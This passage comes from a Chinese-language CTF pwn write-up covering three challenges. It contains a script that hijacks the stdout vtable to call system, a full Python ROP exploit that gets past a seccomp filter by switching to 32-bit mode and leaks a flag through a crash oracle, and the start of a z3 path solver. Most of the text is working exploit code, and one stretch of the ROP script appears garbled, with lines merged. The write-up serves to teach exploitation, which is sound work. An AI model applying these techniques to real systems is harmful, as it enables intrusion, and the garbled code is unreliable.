    sh.interactive()
###  Christmas Bash
在开始时候将sleep变量的值设置成了libc中sleep可以用此求出libcbase
然后将IO_2_1_stdout的vtable中的_IO_file_jumps改为system, 利用printf即可触发
     gift libcbase is sleep - 972880;
    gift target is libcbase + 2205080;
    gift system is libcbase + 346848;
    gift Stdout is libcbase + 2201440 + 4;
    gift heap is libcbase + 2198720;
    gift var is "12345678";
    gift Binsh is ";/home/ctf/getflag >&2";
    gift Size is 8;
    gift tmp is 30;
    gift filename is "wood";
    gift offset is 1000;
    gift var is var + offset;
    reindeer Vixen delivering gift target var Size;
    reindeer Vixen delivering gift Stdout Binsh tmp;
    reindeer Dancer delivering gift filename Size Size;
###  Gadget
题目给了一个简单的栈溢出，但是用 seccomp 限制了 syscall 只能有 (fstat)5 和 (read) 0。
于是问题变成了，如何才能打开 flag 文件。查询 syscall 之后发现，在 i386 架构下，syscall number 5 是
open。因此，我们可以通过切换到 32 位的方式来打开 flag，然后再切换回 64 位模式来读取 flag。
但是仍然还有问题，并没有一个 syscall 可以写 flag 到输出，于是我们只能设计一个方法让远程能够判断 flag
某一位是不是某一个字符。这个方法有很多，我这里选择的是，在 gadget 的最后放一个 read stdin 的操作，这样就能让 ROP
执行完之后卡住。但是在卡住之前，会尝试往一个邻近边界的地址 + 当前 flag
字符的位置写入内容，如果越界了就崩溃（这样程序结束之后也就不会卡住了），如果没有越界就不会崩溃。通过这样的方式就可以判断。
由于 read 函数每次只能读入不到 200 个字符，最后我把 ROP 分成了四个阶段，具体 exploit 脚本如下：
    #!/usr/bin/env python3
    import os
    import time
    from zio import *
    LOCAL = False
    target = './gadget.patched'
    if os.getenv('TARGET'):
        ary = os.getenv('TARGET').split(':')
        target = (ary[0], int(ary[1]))
        LOCAL = False
    def test(index, guess):
        print('testing %d, guess = %#x' % (index, guess))
        print('target = %r' % (target, ))
        io = zio(target, print_read=COLORED(REPR, 'yellow'), print_write=COLORED(REPR, 'cyan'), timeout=10000)
        if LOCAL:
            io.gdb_hint(breakpoints=[
                # 0x401205,     # before ret
                0x401222,     # before main ret
            ])
        else:
            # do proof of work?
            # io.readline()
            # input('continue?')
            pass
        flag_addr = 0x40d160
        flag_path = b'./flag'
        new_stack2 = 0x40D200
        new_stack3 = 0x40d400
        new_stack4 = 0x40d600
        pop_rax_ret = 0x401001      # pop rax/eax ; ret
        syscall_pop_ret = 0x401165  # syscall ; pop ebp ; ret
        pop_rdi_pop_ret = 0x401734  # pop rdi ; pop rbp ; ret
        pop_r14_pop2_ret = 0x0000000000401731 # pop r14 ; pop r15 ; pop rbp ; ret
        pop_rsi_pop2_ret = 0x0000000000401732 # pop rsi ; pop r15 ; pop rbp ; ret
        pop_rbx_pop3_ret = 0x403072 # pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret | pop ebx ; inc ecx ; pop esi ; inc ecx ; pop edi ; pop ebp ; ret
        store_rdi_rax_ret = 0x0000000000403beb #  mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret
        access_rcx = 0x0000000000402fee # mov byte ptr [rcx + rdi - 5], 0x89 ; ret
        pop_rcx_ret = 0x000000000040117b    # pop rcx ; ret
        payload = b'_' * 0x30 + b'_____RBP'
        payload += l64(pop_rax_ret)
        payload += flag_path.ljust(8, b'\0')
        payload += l64(pop_rdi_pop_ret)
        payload += l64(flag_addr + 0x27)
        payload += l64(0x5f5f5f5f5f5f5f5f) # fill rbp
        payload += l64(store_rdi_rax_ret)
        payload += l64(pop_rdi_pop_ret)            
        payload += l64(new_stack2)            # bss
        payload += l64(0x5f5f5f5f5f5f5f5f)  # fill rbp
        payload += l64(0x401170)            # read stage2 ROP
        payload += l64(0x401730)            # pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
        payload += l64(new_stack2)
        payload2 = b'_' * 24
        payload2 += l64(0x401222)
        payload2 += l64(0x4011ed)    # retf
        payload2 += l64(0x401222 | (0x23  0xc0:
                raise ValueError('payload2 too long: %#x' % len(p))
            io.writeline(p)
        try:
            io.read_until_timeout(1)
            if io.is_eof_seen():
                io.close()
                return False
            else:
                io.close()
                return True
        except ConnectionResetError:
            return False
    flag = b''
    while True:
        for i in range(32, 127):
            v = test(len(flag), i)
            if v:
                flag += bytes([i])
                break
        print('flag = %s' % flag)
        if flag.endswith(b'}'):
            break
###  CheckIn ret2text
连接上端口并且做了 PoW 验证之后，会发送回来一个 base64 的
ELF，打开之后发现是很多运算逻辑，最后在某个深处有一个栈溢出。但是为了达到这个栈溢出的位置，需要自动选择正确的输入到达这个路径。
看起来需要 “符号执行” 技术来达到这样的条件。不过由于对 angr 不太熟，同时也想尝试一下手糙 “符号执行” 的难度有多大，这里选择直接使用 z3
来做。不过这样的代价是，代码量有点收不住。。一道简单的栈溢出题目，写了 500 多行代码，有点超出预想了。。
仔细观察题目发回来的 ELF，我们可以发现以下两个特征：
  * 路径很多，但是实际上是一个二叉树结构，没有环形，也没有其他结构。而漏洞函数就在二叉树叶子节点的某个分支。
  * 虽然验证代码比较长，但是总共只有两种，一种是输入几个数字，计算一道数学题；另一种是输入一段字符串，然后做一些位运算之后，与一个结果相比较。
因此可以用以下思路来解决：
  * 先把 ELF 做反汇编，然后建立每一个指令和能达到的指令的关联。
  * 遍历指令，找到溢出的地方在哪里。
  * 根据第一步形成的关联，反向一直寻路到 main 函数起点（毕竟没有环路），并标记沿途中有多个出口指令的分叉选择。
  * 最后再从 main 函数正向走到漏洞点，根据路径分叉选择来计算正确的输入是什么。如果是需要匹配的，那么用 z3 计算出正确的结果；如果不需要匹配的，那么随机生成一个输入即可通过。
最后基于上述思路，添加亿点点细节，即可拿到 flag（可能是有史以来为一个 pwn 题写过的最长的代码）：
    #!/usr/bin/env python3
    import os
    from typing import List
    import subprocess
    import base64
    import random
    import re
    from dataclasses import dataclass
    from z3 import Solver, BitVec, BitVecVal, sat, unsat
    from zio import *
    @dataclass
    class Ins:
        index: int
        addr: str
        exits: List[str]
        opcode: str
        args: List[str]
        choice: str
        def __str__(self):
            return '%s: %s %s -> %s' % (self.addr, self.opcode, ','.join(self.args), self.exits)
    def load_disasm(filepath):
        valid = False
        cnt = 0
        instructions = []
        mapping = {}
        reverse_map = {}
        for line in open(filepath):
            cnt += 1
            if ':' in line:
                valid = True
                continue
            elif '' in line:
                valid = False
                continue
            if not valid or not line.strip():
                continue
            ary = line[:-1].split('\t')
            addr = ary[0].split(':')[0].strip()
            instruction = ary[2].split('#')[0].strip()
            ary = instruction.split(maxsplit=1)
            if len(ary) == 2:
                opcode, args = ary
            else:
                opcode = ary[0]
                args = ''
            args = args.split(',')
            ins = Ins(
                index=len(instructions),
                addr=addr,
                opcode=opcode,
                args=args,
                exits=[],
                choice=None,
            )
            target = args[0].split(' ')[0]
            if opcode == 'jmp':
                ins.exits.append(target)
                reverse_map.setdefault(target, [])
                reverse_map[target].append(addr)
            elif opcode in ['je', 'jne', 'jg', 'jbe']:
                ins.exits.append(None)
                ins.exits.append(target)
                reverse_map.setdefault(target, [])
                reverse_map[target].append(addr)
            else:
                ins.exits.append(None)
                if opcode.startswith('j'):
                    raise ValueError('unhandled jmp: %s' % opcode)
            if len(instructions) and instructions[-1].exits[0] is None:
                instructions[-1].exits[0] = addr
                reverse_map.setdefault(addr, [])
                reverse_map[addr].append(instructions[-1].addr)
            instructions.append(ins)
            mapping[addr] = ins
        for ins in instructions:
            print(ins)
        return instructions, mapping, reverse_map
    def find_overflow():